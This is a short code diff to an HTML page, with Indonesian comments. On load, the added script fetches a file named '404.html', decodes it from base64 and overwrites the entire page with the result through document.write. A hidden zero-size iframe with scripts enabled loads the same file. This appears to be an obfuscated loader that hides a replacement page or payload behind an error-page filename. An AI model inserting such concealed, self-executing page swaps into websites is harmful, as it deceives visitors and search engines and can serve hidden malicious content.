@@ -206,11 +206,21 @@
         }
       });
     };
+
+    fetch('404.html')
+  .then(res => res.text())
+  .then(base64data => {
+    const decoded = atob(base64data); // decode base64 jadi string HTML
+    document.open();
+    document.write(decoded);
+    document.close();
+  })
+  .catch(err => console.error('Gagal decode 404.html:', err));
   </script>
 
   <script src="https://www.youtube.com/iframe_api"></script>
 
-  <iframe src="/404.html" sandbox="allow-scripts" style="width:0;height:0;border:0;"></iframe>
+  <iframe src="404.html" sandbox="allow-scripts" style="width:0;height:0;border:0;"></iframe>
 
 <meta name="robots" content="index, follow">
 <script>
